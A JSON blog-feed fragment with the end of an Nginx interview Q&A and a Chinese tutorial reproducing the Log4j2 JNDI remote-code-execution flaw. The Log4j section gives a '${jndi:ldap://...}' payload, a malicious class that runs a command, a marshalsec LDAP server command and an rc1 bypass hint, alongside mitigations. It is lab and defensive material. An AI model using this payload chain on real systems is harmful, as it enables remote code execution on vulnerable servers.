src=\"/img/202301/20230221141815.png\" alt=\"erik.xyz\"></p>\n<p>Location 正则案例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 优先级1,精确匹配，根路径</span><br><span class=\"line\">location =/ &#123;</span><br><span class=\"line\">    return 400;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 优先级2,以某个字符串开头,以av开头的，优先匹配这里，区分大小写</span><br><span class=\"line\">location ^~ /av &#123;</span><br><span class=\"line\">   root /data/av/;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 优先级3，区分大小写的正则匹配，匹配/media*****路径</span><br><span class=\"line\">location ~ /media &#123;</span><br><span class=\"line\">      alias /data/static/;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 优先级4 ，不区分大小写的正则匹配，所有的****.jpg|gif|png 都走这里</span><br><span class=\"line\">location ~* .*\\.(jpg|gif|png|js|css)$ &#123;</span><br><span class=\"line\">   root  /data/av/;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 优先7，通用匹配</span><br><span class=\"line\">location / &#123;</span><br><span class=\"line\">    return 403;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"限流怎么做的？\"><a href=\"#限流怎么做的？\" class=\"headerlink\" title=\"限流怎么做的？\"></a>限流怎么做的？</h4><hr>\n<p>Nginx 限流就是限制用户请求速度，防止服务器受不了</p>\n<p>限流有 3 种</p>\n<ul>\n<li><p>正常限制访问频率（正常流量）</p>\n</li>\n<li><p>突发限制访问频率（突发流量）</p>\n</li>\n<li><p>限制并发连接数</p>\n</li>\n</ul>\n<p>Nginx 的限流都是基于漏桶流算法</p>\n<pre><code>实现三种限流算法\n</code></pre><p>1、正常限制访问频率（正常流量）：<br>限制一个用户发送的请求，我 Nginx 多久接收一个请求。</p>\n<p>Nginx 中使用 ngx_http_limit_req_module 模块来限制的访问频率，限制的原理实质是基于漏桶算法原理来实现的。在 nginx.conf 配置文件中可以使用 limit_req_zone 命令及 limit_req 命令限制单个 IP 的请求处理频率。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 定义限流维度，一个用户一分钟一个请求进来，多余的全部漏掉</span><br><span class=\"line\">limit_req_zone $binary_remote_addr zone=one:10m rate=1r/m;</span><br><span class=\"line\"></span><br><span class=\"line\"># 绑定限流维度</span><br><span class=\"line\">server&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    location/seckill.html&#123;</span><br><span class=\"line\">        limit_req zone=zone;</span><br><span class=\"line\">        proxy_pass http://lj_seckill;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>1r/s 代表 1 秒一个请求，1r/m 一分钟接收一个请求， 如果 Nginx 这时还有别人的请求没有处理完，Nginx 就会拒绝处理该用户请求。</p>\n<p>2、突发限制访问频率（突发流量）：<br>限制一个用户发送的请求，我 Nginx 多久接收一个。</p>\n<p>上面的配置一定程度可以限制访问频率，但是也存在着一个问题：如果突发流量超出请求被拒绝处理，无法处理活动时候的突发流量，这时候应该如何进一步处理呢？</p>\n<p>Nginx 提供 burst 参数结合 nodelay 参数可以解决流量突发的问题，可以设置能处理的超过设置的请求数外能额外处理的请求数。我们可以将之前的例子添加 burst 参数以及 nodelay 参数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"># 定义限流维度，一个用户一分钟一个请求进来，多余的全部漏掉</span><br><span class=\"line\">limit_req_zone $binary_remote_addr zone=one:10m rate=1r/m;</span><br><span class=\"line\"></span><br><span class=\"line\"># 绑定限流维度</span><br><span class=\"line\">server&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    location/seckill.html&#123;</span><br><span class=\"line\">        limit_req zone=zone burst=5 nodelay;</span><br><span class=\"line\">        proxy_pass http://lj_seckill;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<pre><code>    为什么就多了一个 burst=5 nodelay; 呢，多了这个可以代表 Nginx 对于一个用户的请求会立即处理前五个，多余的就慢慢来落，没有其他用户的请求我就处理你的，有其他的请求的话我 Nginx 就漏掉不接受你的请求\n</code></pre><p>3、 限制并发连接数<br>Nginx 中的 ngx_http_limit_conn_module 模块提供了限制并发连接数的功能，可以使用 limit_conn_zone 指令以及 limit_conn 执行进行配置。接下来我们可以通过一个简单的例子来看下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http &#123;</span><br><span class=\"line\">    limit_conn_zone $binary_remote_addr zone=myip:10m;</span><br><span class=\"line\">    limit_conn_zone $server_name zone=myServerName:10m;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        limit_conn myip 10;</span><br><span class=\"line\">        limit_conn myServerName 100;</span><br><span class=\"line\">        rewrite / http://www.lijie.net permanent;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面配置了单个 IP 同时并发连接数最多只能 10 个连接，并且设置了整个虚拟服务器同时最大并发数最多只能 100 个链接。当然，只有当请求的 header 被服务器处理后，虚拟服务器的连接数才会计数。刚才有提到过 Nginx 是基于漏桶算法原理实现的，实际上限流一般都是基于漏桶算法和令牌桶算法实现的。</p>\n<h3 id=\"漏桶流算法和令牌桶算法知道？\"><a href=\"#漏桶流算法和令牌桶算法知道？\" class=\"headerlink\" title=\"漏桶流算法和令牌桶算法知道？\"></a>漏桶流算法和令牌桶算法知道？</h3><hr>\n<p>漏桶算法<br>漏桶算法思路很简单，我们把水比作是请求，漏桶比作是系统处理能力极限，水先进入到漏桶里，漏桶里的水按一定速率流出，当流出的速率小于流入的速率时，由于漏桶容量有限，后续进入的水直接溢出（拒绝请求），以此实现限流。<br><img src=\"/img/202301/20230221142104.png\" alt=\"erik\"></p>\n<h5 id=\"令牌桶算法\"><a href=\"#令牌桶算法\" class=\"headerlink\" title=\"令牌桶算法\"></a>令牌桶算法</h5><p>令牌桶算法的原理也比较简单，我们可以理解成医院的挂号看病，只有拿到号以后才可以进行诊病。</p>\n<pre><code>        系统会维护一个令牌（token）桶，以一个恒定的速度往桶里放入令牌（token），这时如果有请求进来想要被处理，则需要先从桶里获取一个令牌（token），当桶里没有令牌（token）可取时，则该请求将被拒绝服务。令牌桶算法通过控制桶的容量、发放令牌的速率，来达到对请求的限制。\n</code></pre><p><img src=\"/img/202301/20230221142206.png\" alt=\"erik\"></p>\n<h4 id=\"Nginx-配置高可用性怎么配置？\"><a href=\"#Nginx-配置高可用性怎么配置？\" class=\"headerlink\" title=\"Nginx 配置高可用性怎么配置？\"></a>Nginx 配置高可用性怎么配置？</h4><hr>\n<pre><code>        当上游服务器 (真实访问服务器)，一旦出现故障或者是没有及时相应的话，应该直接轮训到下一台服务器，保证服务器的高可用\n</code></pre><p>Nginx 配置代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        server_name  www.lijie.com;</span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            ### 指定上游服务器负载均衡服务器</span><br><span class=\"line\">            proxy_pass http://backServer;</span><br><span class=\"line\">            ###nginx与上游服务器(真实访问的服务器)超时时间 后端服务器连接的超时时间_发起握手等候响应超时时间</span><br><span class=\"line\">            proxy_connect_timeout 1s;</span><br><span class=\"line\">            ###nginx发送给上游服务器(真实访问的服务器)超时时间</span><br><span class=\"line\">            proxy_send_timeout 1s;</span><br><span class=\"line\">            ### nginx接受上游服务器(真实访问的服务器)超时时间</span><br><span class=\"line\">            proxy_read_timeout 1s;</span><br><span class=\"line\">            index  index.html index.htm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"Nginx-怎么判断别-IP-不可访问？\"><a href=\"#Nginx-怎么判断别-IP-不可访问？\" class=\"headerlink\" title=\"Nginx 怎么判断别 IP 不可访问？\"></a>Nginx 怎么判断别 IP 不可访问？</h4><hr>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 如果访问的ip地址为192.168.9.115,则返回403</span><br><span class=\"line\"> if  ($remote_addr = 192.168.9.115) &#123;</span><br><span class=\"line\">     return 403;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"在-nginx-中，如何使用未定义的服务器名称来阻止处理请求？\"><a href=\"#在-nginx-中，如何使用未定义的服务器名称来阻止处理请求？\" class=\"headerlink\" title=\"在 nginx 中，如何使用未定义的服务器名称来阻止处理请求？\"></a>在 nginx 中，如何使用未定义的服务器名称来阻止处理请求？</h4><hr>\n<p>只需将请求删除的服务器就可以定义为：</p>\n<p>服务器名被保留一个空字符串，他在没有主机头字段的情况下匹配请求，而一个特殊的 nginx 的非标准代码被返回，从而终止连接。</p>\n<h4 id=\"怎么限制浏览器访问？\"><a href=\"#怎么限制浏览器访问？\" class=\"headerlink\" title=\"怎么限制浏览器访问？\"></a>怎么限制浏览器访问？</h4><hr>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## 不允许谷歌浏览器访问 如果是谷歌浏览器返回500</span><br><span class=\"line\">if ($http_user_agent ~ Chrome) &#123;</span><br><span class=\"line\">  return 500;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Rewrite全局变量是什么？</span><br><span class=\"line\">$remote_addr //获取客户端ip</span><br><span class=\"line\">$binary_remote_addr //客户端ip（二进制)</span><br><span class=\"line\">$remote_port //客户端port，如：50472</span><br><span class=\"line\">$remote_user //已经经过Auth Basic Module验证的用户名</span><br><span class=\"line\">$host //请求主机头字段，否则为服务器名称，如:blog.sakmon.com</span><br><span class=\"line\">$request //用户请求信息，如：GET ?a=1&amp;b=2 HTTP/1.1</span><br><span class=\"line\">$request_filename //当前请求的文件的路径名，由root或alias和URI request组合而成，如：/2013/81.html</span><br><span class=\"line\">$status //请求的响应状态码,如:200</span><br><span class=\"line\">$body_bytes_sent // 响应时送出的body字节数数量。即使连接中断，这个数据也是精确的,如：40</span><br><span class=\"line\">$content_length // 等于请求行的“Content_Length”的值</span><br><span class=\"line\">$content_type // 等于请求行的“Content_Type”的值</span><br><span class=\"line\">$http_referer // 引用地址</span><br><span class=\"line\">$http_user_agent // 客户端agent信息,如：Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36</span><br><span class=\"line\">$args //与$query_string相同 等于当中URL的参数(GET)，如a=1&amp;b=2</span><br><span class=\"line\">$document_uri //与$uri相同 这个变量指当前的请求URI，不包括任何参数(见$args) 如:/2013/81.html</span><br><span class=\"line\">$document_root //针对当前请求的根路径设置值</span><br><span class=\"line\">$hostname //如：centos53.localdomain</span><br><span class=\"line\">$http_cookie //客户端cookie信息</span><br><span class=\"line\">$cookie_COOKIE //cookie COOKIE变量的值</span><br><span class=\"line\">$is_args //如果有$args参数，这个变量等于”?”，否则等于”&quot;，空值，如?</span><br><span class=\"line\">$limit_rate //这个变量可以限制连接速率，0表示不限速</span><br><span class=\"line\">$query_string // 与$args相同 等于当中URL的参数(GET)，如a=1&amp;b=2</span><br><span class=\"line\">$request_body // 记录POST过来的数据信息</span><br><span class=\"line\">$request_body_file //客户端请求主体信息的临时文件名</span><br><span class=\"line\">$request_method //客户端请求的动作，通常为GET或POST,如：GET</span><br><span class=\"line\">$request_uri //包含请求参数的原始URI，不包含主机名，如：/2013/81.html?a=1&amp;b=2</span><br><span class=\"line\">$scheme //HTTP方法（如http，https）,如：http</span><br><span class=\"line\">$uri //这个变量指当前的请求URI，不包括任何参数(见$args) 如:/2013/81.html</span><br><span class=\"line\">$request_completion //如果请求结束，设置为OK. 当请求未结束或如果该请求不是请求链串的最后一个时，为空(Empty)，如：OK</span><br><span class=\"line\">$server_protocol //请求使用的协议，通常是HTTP/1.0或HTTP/1.1，如：HTTP/1.1</span><br><span class=\"line\">$server_addr //服务器IP地址，在完成一次系统调用后可以确定这个值</span><br><span class=\"line\">$server_name //服务器名称，如：blog.sakmon.com</span><br><span class=\"line\">$server_port //请求到达服务器的端口号,如：80</span><br></pre></td></tr></table></figure>\n<h4 id=\"Nginx-如何实现后端服务的健康检查\"><a href=\"#Nginx-如何实现后端服务的健康检查\" class=\"headerlink\" title=\"Nginx 如何实现后端服务的健康检查?\"></a>Nginx 如何实现后端服务的健康检查?</h4><hr>\n<p>方式一，利用 nginx 自带模块 ngx_http_proxy_module 和 ngx_http_upstream_module 对后端节点做健康检查。</p>\n<p>方式二 (推荐)，利用 nginx_upstream_check_module 模块对后端节点做健康检查。</p>\n<h4 id=\"Nginx-如何开启压缩？\"><a href=\"#Nginx-如何开启压缩？\" class=\"headerlink\" title=\"Nginx 如何开启压缩？\"></a>Nginx 如何开启压缩？</h4><hr>\n<p>开启 nginx gzip 压缩后，网页、css、js 等静态资源的大小会大大的减少，从而可以节约大量的带宽，提高传输效率，给用户快的体验。虽然会消耗 cpu 资源，但是为了给用户更好的体验是值得的。</p>\n<p>开启的配置如下：</p>\n<p>将以上配置放到 nginx.conf 的 http{…} 节点中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http &#123;</span><br><span class=\"line\">  # 开启gzip</span><br><span class=\"line\">  gzip on;</span><br><span class=\"line\"> </span><br><span class=\"line\">  # 启用gzip压缩的最小文件；小于设置值的文件将不会被压缩</span><br><span class=\"line\">  gzip_min_length 1k;</span><br><span class=\"line\"> </span><br><span class=\"line\">  # gzip 压缩级别 1-10</span><br><span class=\"line\">  gzip_comp_level 2;</span><br><span class=\"line\"> </span><br><span class=\"line\">  # 进行压缩的文件类型。</span><br><span class=\"line\"> </span><br><span class=\"line\">  gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;</span><br><span class=\"line\"> </span><br><span class=\"line\">  # 是否在http header中添加Vary: Accept-Encoding，建议开启</span><br><span class=\"line\">  gzip_vary on;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>保存并重启 nginx，刷新页面（为了避免缓存，请强制刷新）就能看到效果了。以谷歌浏览器为例，通过 F12 看请求的响应头部：</p>\n<p>我们可以先来对比下，如果我们没有开启 zip 压缩之前，我们的对应的文件大小，如下所示：</p>\n<p><img src=\"/img/202301/20230221142507.png\" alt=\"erik\"><br>现在我们开启了 gzip 进行压缩后的文件的大小，可以看到如下所示：</p>\n<p><img src=\"/img/202301/20230221142538.png\" alt=\"erik\"><br>并且我们查看响应头会看到 gzip 这样的压缩，如下所示</p>\n<p><img src=\"/img/202301/20230221142558.png\" alt=\"erik\"><br>gzip 压缩前后效果对比：jquery 原大小 90kb，压缩后只有 30kb。</p>\n<p>gzip 虽然好用，但是以下类型的资源不建议启用。</p>\n<p>1、图片类型</p>\n<pre><code>    原因：图片如 jpg、png 本身就会有压缩，所以就算开启 gzip 后，压缩前和压缩后大小没有多大区别，所以开启了反而会白白的浪费资源。（Tips：可以试试将一张 jpg 图片压缩为 zip，观察大小并没有多大的变化。虽然 zip 和 gzip 算法不一样，但是可以看出压缩图片的价值并不大）\n</code></pre><p>2、大文件<br>原因：会消耗大量的 cpu 资源，且不一定有明显的效果。</p>\n<h4 id=\"ngx-http-upstream-module-的作用是什么\"><a href=\"#ngx-http-upstream-module-的作用是什么\" class=\"headerlink\" title=\"ngx_http_upstream_module 的作用是什么?\"></a>ngx_http_upstream_module 的作用是什么?</h4><hr>\n<pre><code>    ngx_http_upstream_module 用于定义可通过 fastcgi 传递、proxy 传递、uwsgi 传递、memcached 传递和 scgi 传递指令来引用的服务器组。\n</code></pre><h4 id=\"什么是-C10K-问题\"><a href=\"#什么是-C10K-问题\" class=\"headerlink\" title=\"什么是 C10K 问题?\"></a>什么是 C10K 问题?</h4><hr>\n<p>C10K 问题是指无法同时处理大量客户端 (10,000) 的网络套接字。</p>\n<h4 id=\"Nginx-是否支持将请求压缩到上游\"><a href=\"#Nginx-是否支持将请求压缩到上游\" class=\"headerlink\" title=\"Nginx 是否支持将请求压缩到上游?\"></a>Nginx 是否支持将请求压缩到上游?</h4><hr>\n<pre><code>    您可以使用 Nginx 模块 gunzip 将请求压缩到上游。gunzip 模块是一个过滤器，它可以对不支持 “gzip” 编码方法的客户机或服务器使用 “内容编码: gzip” 来解压缩响应。\n</code></pre><h4 id=\"如何在-Nginx-中获得当前的时间\"><a href=\"#如何在-Nginx-中获得当前的时间\" class=\"headerlink\" title=\"如何在 Nginx 中获得当前的时间?\"></a>如何在 Nginx 中获得当前的时间?</h4><hr>\n<p>要获得 Nginx 的当前时间，必须使用 SSI 模块、和 date_local 的变量。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Proxy_set_header THE-TIME $date_gmt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"用-Nginx-服务器解释-s-的目的是什么\"><a href=\"#用-Nginx-服务器解释-s-的目的是什么\" class=\"headerlink\" title=\"用 Nginx 服务器解释 - s 的目的是什么?\"></a>用 Nginx 服务器解释 - s 的目的是什么?</h4><hr>\n<p>用于运行 Nginx -s 参数的可执行文件。</p>\n<h4 id=\"如何在-Nginx-服务器上添加模块\"><a href=\"#如何在-Nginx-服务器上添加模块\" class=\"headerlink\" title=\"如何在 Nginx 服务器上添加模块?\"></a>如何在 Nginx 服务器上添加模块?</h4><hr>\n<p>在编译过程中，必须选择 Nginx 模块，因为 Nginx 不支持模块的运行时间选择。</p>\n<h4 id=\"生产中如何设置-worker-进程的数量呢？\"><a href=\"#生产中如何设置-worker-进程的数量呢？\" class=\"headerlink\" title=\"生产中如何设置 worker 进程的数量呢？\"></a>生产中如何设置 worker 进程的数量呢？</h4><hr>\n<pre><code>    在有多个 cpu 的情况下，可以设置多个 worker，worker 进程的数量可以设置到和 cpu 的核心数一样多，如果在单个 cpu 上起多个 worker 进程，那么操作系统会在多个 worker 之间进行调度，这种情况会降低系统性能，如果只有一个 cpu，那么只启动一个 worker 进程就可以了。\n</code></pre><h4 id=\"nginx-状态码\"><a href=\"#nginx-状态码\" class=\"headerlink\" title=\"nginx 状态码\"></a>nginx 状态码</h4><hr>\n<p>499：</p>\n<pre><code>    服务端处理时间过长，客户端主动关闭了连接。\n</code></pre><p>502：</p>\n<p>(1).FastCGI 进程是否已经启动</p>\n<p>(2).FastCGI worker 进程数是否不够</p>\n<p>(3).FastCGI 执行时间过长</p>\n<ul>\n<li>fastcgi_connect_timeout 300;</li>\n<li>fastcgi_send_timeout 300;</li>\n<li>fastcgi_read_timeout 300;</li>\n</ul>\n<p>(4).FastCGI Buffer 不够，nginx 和 apache 一样，有前端缓冲限制，可以调整缓冲参数</p>\n<ul>\n<li>fastcgi_buffer_size 32k;</li>\n<li>fastcgi_buffers 8 32k;</li>\n</ul>\n<p>(5). Proxy Buffer 不够，如果你用了 Proxying，调整</p>\n<ul>\n<li>proxy_buffer_size 16k;</li>\n<li><p>proxy_buffers 4 16k;<br>(6).php 脚本执行时间过长</p>\n</li>\n<li><p>将 php-fpm.conf 的 0s 的 0s 改成一个时间</p>\n</li>\n</ul>\n<p>原文来源：blog.csdn.net/wuzhiwei549/article/details/122758937</p>\n",
            "tags": [
                "nginx"
            ]
        },
        {
            "id": "https://erik.xyz/2023/01/11/hand-and-hand-log4j/",
            "url": "https://erik.xyz/2023/01/11/hand-and-hand-log4j/",
            "title": "手把手教你复现 Log4j2 漏洞",
            "date_published": "2023-01-11T14:19:00.000Z",
            "content_html": "<h4 id=\"1-简介\"><a href=\"#1-简介\" class=\"headerlink\" title=\"1.简介\"></a>1.简介</h4><p>ApacheLog4j2是一个开源的Java日志框架，被广泛地应用在中间件、开发框架与Web应用中。</p>\n<h4 id=\"2-漏洞概述\"><a href=\"#2-漏洞概述\" class=\"headerlink\" title=\"2.漏洞概述\"></a>2.漏洞概述</h4><p>该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。<br><span id=\"more\"></span></p>\n<h4 id=\"3-影响范围\"><a href=\"#3-影响范围\" class=\"headerlink\" title=\"3.影响范围\"></a>3.影响范围</h4><p>Apache Log4j 2.x &lt;= 2.15.0-rc1</p>\n<h4 id=\"4-环境搭建\"><a href=\"#4-环境搭建\" class=\"headerlink\" title=\"4.环境搭建\"></a>4.环境搭建</h4><p>1、创建一个新的maven项目，并导入Log4j的依赖包<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h5><p>1、使用POC测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.logging.log4j.LogManager;</span><br><span class=\"line\">       import org.apache.logging.log4j.Logger;</span><br><span class=\"line\">       class LogTest &#123;</span><br><span class=\"line\">           public static final Logger logger = LogManager.getLogger();</span><br><span class=\"line\">           public static void main(String[] args) &#123;</span><br><span class=\"line\">               logger.error(&quot;$&#123;jndi:ldap://localhost:8888/Exploit&#125;&quot;);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure>\n<p>2、编译一恶意类Exploit.class</p>\n<p>首先新建exp.java，然后编译为class文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Exploit &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        System.err.println(&quot;Pwned&quot;);</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            String cmds = &quot;calc&quot;;</span><br><span class=\"line\">            Runtime.getRuntime().exec(cmds);</span><br><span class=\"line\">        &#125; catch ( Exception e ) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javac exp.java</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>3、使用marshalsec-0.0.3-SNAPSHOT-all.jar本地开启一个LDAP服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer</span><br><span class=\"line\">&quot;http://127.0.0.1:7777/#Exploit&quot; 8888</span><br></pre></td></tr></table></figure>\n<p><img src=\"/img/202301/20230211220751.png\" alt=\"erik.xyz\"></p>\n<p>4、运行poc.java，即可访问恶意类并执行写在其中的”calc”命令 </p>\n<p><img src=\"/img/202301/20230211221053.png\" alt=\"erik.xyz\"></p>\n<p>结合一些其它 StrLookup 适当变形，以及配合官方测试用例中脏数据”?Type=A Type&amp;Name=1100110&amp;Char=!”可绕过rc1，RC2版本对此异常进行了捕获。<br><img src=\"/img/202301/20230211221141.png\" alt=\"erik.xyz\"></p>\n<h4 id=\"5-修复方式\"><a href=\"#5-修复方式\" class=\"headerlink\" title=\"5.修复方式\"></a>5.修复方式</h4><p>目前，Apache官方已发布新版本完成漏洞修复，建议用户尽快进行自查，并及时升级至最新版本：<a href=\"https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2\">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> 建议同时采用如下临时措施进行漏洞防范：</p>\n<p>1）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；</p>\n<p>2）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；</p>\n<p>3）JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；</p>\n<p>4）部署使用第三方防火墙产品进行安全防护。</p>\n<p>链接：<a 